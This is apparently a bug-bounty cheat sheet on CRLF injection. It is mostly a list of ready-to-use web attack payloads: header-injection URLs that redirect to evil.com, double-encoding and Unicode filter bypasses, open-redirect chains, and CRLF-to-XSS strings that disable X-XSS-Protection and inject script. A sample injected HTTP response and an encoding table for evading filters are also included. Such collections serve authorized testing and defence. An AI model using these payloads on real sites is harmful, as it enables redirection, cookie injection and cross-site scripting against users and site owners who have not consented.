# CRLF Injection

## Introduction
A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.

## Where to find
It can be found anywhere, always check the request and response. Try to search for parameters that lead to redirects, you can see the response is (301, 302, 303, 307, 308).

## How to exploit
1. Basic payload
```
https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
```
The response is
```
HTTP/1.1 200 OK
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Set-Cookie: language=en
Location: https://evil.com/
```

2. Double encode
```
https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
```

3. Bypass unicode
```
https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/
```
4. CRLF chained with Open Redirect
```
https://example.com//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2  
https://example.com/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2   
https://example.com/google.com/%2F..%0D%0AHeader-Test:test2
https://example.com/%0d%0aLocation:%20http://example.com
```
5. CRLF Injection to XSS
```
https://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
https://example.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```
6. Filter Bypass
```
%E5%98%8A = %0A = \u560a
%E5%98%8D = %0D = \u560d
%E5%98%BE = %3E = \u563e (>)
%E5%98%BC = %3C = \u563c (<)
Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```

### References:
- https://medium.com/cyberverse/crlf-injection-playbook-472c67f1cb46
- https://github.com/daffainfo/AllAboutBugBounty
